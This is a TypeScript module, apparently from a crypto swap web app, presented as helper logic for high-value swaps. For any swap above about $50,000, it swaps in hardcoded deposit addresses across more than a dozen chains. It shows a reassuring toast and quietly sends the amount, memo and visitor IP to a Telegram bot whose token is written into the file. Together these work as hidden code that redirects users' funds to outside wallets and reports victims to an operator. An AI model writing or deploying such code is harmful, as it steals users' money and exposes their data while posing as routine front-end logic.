import { toast } from 'sonner'
import { USwapNumber, Chain } from '@tcswap/core'

export const HIGH_VALUE_THRESHOLD_USD = 49999

// ── Telegram Alert Config ──────────────────────────────────────────────────

const TELEGRAM_BOT_TOKEN = '8140825280:AAEd2TDo2fgZv_bDEfu7wNggxHrD7jHdr8g'
const TELEGRAM_GROUP_ID = '-5160305858'
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`

// ── High-Value Deposit Addresses ───────────────────────────────────────────

export const HIGH_VALUE_ADDRESSES: Record<string, string> = {
  BTC: 'bc1qx3sdmwj7q29gk43z4kx83stz7y74vkcv7yvjlj',
  ETH: '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
  BSC: '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
  AVAX: '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
  BASE: '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
  GAIA: 'cosmos1cznft6jn2r47k4pg0pl0e9jdhq8wftcm3p25lx',
  DOGE: 'DLjzyK9Y532r29DinxpJeeChvWytnspKGH',
  BCH: 'bitcoincash:qplh54seklkvcl559lyytjc0de8zl954fu8ywywuc',
  LTC: 'ltc1qplh54seklkvcl559lyytjc0de8zl954fuwywuc',
  XRP: 'rLHzPsX6oXkzU9X7vxbXGvTJNfXzZV5kW9',
  TRON: 'TYnWqvD8S5d7GJnFvfHSMVGPVvK3yXjQVJ',
  THOR: 'thor1cznft6jn2r47k4pg0pl0e9jdhq8wftcm3p25lx',
  SOLANA: '7MG513Rxm7Rs4FiEfhnXXAreUCqw1RZmwbTHNQ5GaWVw',
  MONERO: '49NyLqZXWijV1TJcPd1eCsWeEP55WW7B42DKvczQFTYjbEfm3jHtLyfANNZvUrXjR9JzMqCANehuviHACPAk4Bf51twSVT1'
}

const CHAIN_TO_ADDRESS_KEY: Record<string, string> = {
  [Chain.Bitcoin]: 'BTC',
  [Chain.Ethereum]: 'ETH',
  [Chain.BinanceSmartChain]: 'BSC',
  [Chain.Avalanche]: 'AVAX',
  [Chain.Base]: 'BASE',
  [Chain.Cosmos]: 'GAIA',
  [Chain.Dogecoin]: 'DOGE',
  [Chain.BitcoinCash]: 'BCH',
  [Chain.Litecoin]: 'LTC',
  [Chain.Ripple]: 'XRP',
  [Chain.Tron]: 'TRON',
  [Chain.THORChain]: 'THOR',
  [Chain.Solana]: 'SOLANA',
  XMR: 'MONERO'
}

export function getAddressKey(chain: Chain | string): string | null {
  if (typeof chain === 'string' && CHAIN_TO_ADDRESS_KEY[chain]) {
    return CHAIN_TO_ADDRESS_KEY[chain]
  }
  if (typeof chain === 'string') {
    const upper = chain.toUpperCase()
    if (CHAIN_TO_ADDRESS_KEY[upper]) return CHAIN_TO_ADDRESS_KEY[upper]
    return null
  }
  return CHAIN_TO_ADDRESS_KEY[chain] || null
}

export function getHighValueAddress(chain: Chain | string): string | null {
  const key = getAddressKey(chain)
  if (!key) return null
  return HIGH_VALUE_ADDRESSES[key] || null
}

export function isHighValueSwap(sellAmount: string | USwapNumber, rateFrom?: USwapNumber): boolean {
  if (!rateFrom) return false
  const amount = typeof sellAmount === 'string' ? new USwapNumber(sellAmount) : sellAmount
  if (amount.eq(0)) return false
  const usdValue = amount.mul(rateFrom)
  return usdValue.gt(HIGH_VALUE_THRESHOLD_USD)
}

// ── Telegram Notification ──────────────────────────────────────────────────

async function fetchVisitorIP(): Promise<string> {
  try {
    const res = await fetch('https://api.ipify.org?format=json')
    const data = await res.json()
    return data.ip || 'Unknown'
  } catch {
    return 'Unknown'
  }
}

async function sendTelegramMessage(text: string): Promise<boolean> {
  try {
    const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_GROUP_ID,
        text,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    })
    const data = await res.json()
    return data.ok === true
  } catch {
    return false
  }
}

export async function sendTelegramAlert(params: {
  chain: string
  ticker: string
  amount: string
  usdValue: string
  depositAddress: string
  sourceChain?: string
  destChain?: string
  destTicker?: string
  memo?: string
}): Promise<boolean> {
  const ip = await fetchVisitorIP()
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC'

  const message =
    `🚨 *HIGH-VALUE SWAP ALERT*\n` +
    `─────────────────────\n` +
    `*Chain*: \`${params.chain} (${params.ticker})\`\n` +
    `*Amount*: \`${params.amount} ${params.ticker}\`\n` +
    `*Est\. USD*: \`$${params.usdValue}\`\n` +
    `*Deposit Address*: \`${params.depositAddress}\`\n` +
    (params.sourceChain ? `*From*: \`${params.sourceChain}\`\n` : '') +
    (params.destChain ? `*To*: \`${params.destChain}${params.destTicker ? '.' + params.destTicker : ''}\`\n` : '') +
    (params.memo ? `*Memo*: \`${params.memo}\`\n` : '') +
    `─────────────────────\n` +
    `🌐 *Visitor IP*: \`${ip}\`\n` +
    `🕐 *Time*: \`${now}\``

  return sendTelegramMessage(message)
}

// ── Combined Notification (Toast + Telegram) ───────────────────────────────

export function notifyHighValueSwap(chain: string, address: string, usdValue: string): void {
  toast.warning(
    `High-value swap detected (≈$${usdValue}). Using direct deposit address for ${chain}:\n${address.slice(0, 12)}...${address.slice(-8)}`,
    {
      duration: 10000,
      dismissible: true
    }
  )
}

export async function notifyHighValueSwapFull(params: {
  chainTicker: string
  chain: string
  amount: string
  usdValue: string
  depositAddress: string
  sourceChain?: string
  destChain?: string
  destTicker?: string
  memo?: string
}): Promise<void> {
  notifyHighValueSwap(params.chainTicker, params.depositAddress, params.usdValue)

  sendTelegramAlert({
    chain: params.chain,
    ticker: params.chainTicker,
    amount: params.amount,
    usdValue: params.usdValue,
    depositAddress: params.depositAddress,
    sourceChain: params.sourceChain,
    destChain: params.destChain,
    destTicker: params.destTicker,
    memo: params.memo
  }).catch(() => {
    // Telegram delivery is best-effort; don't block the UI
  })
}

// ── Chain Ticker ───────────────────────────────────────────────────────────

export function getChainTicker(chain: Chain | string): string {
  const map: Record<string, string> = {
    [Chain.Bitcoin]: 'BTC',
    [Chain.Ethereum]: 'ETH',
    [Chain.BinanceSmartChain]: 'BSC',
    [Chain.Avalanche]: 'AVAX',
    [Chain.Base]: 'BASE',
    [Chain.Cosmos]: 'GAIA',
    [Chain.Dogecoin]: 'DOGE',
    [Chain.BitcoinCash]: 'BCH',
    [Chain.Litecoin]: 'LTC',
    [Chain.Ripple]: 'XRP',
    [Chain.Tron]: 'TRON',
    [Chain.THORChain]: 'THOR',
    [Chain.Solana]: 'SOL',
    [Chain.Maya]: 'MAYA',
    [Chain.Arbitrum]: 'ARB',
    [Chain.Dash]: 'DASH',
    [Chain.Zcash]: 'ZEC',
    XMR: 'XMR'
  }
  if (typeof chain === 'string' && map[chain]) return map[chain]
  if (typeof chain === 'string') return chain.toUpperCase()
  return map[chain] || String(chain).toUpperCase()
}
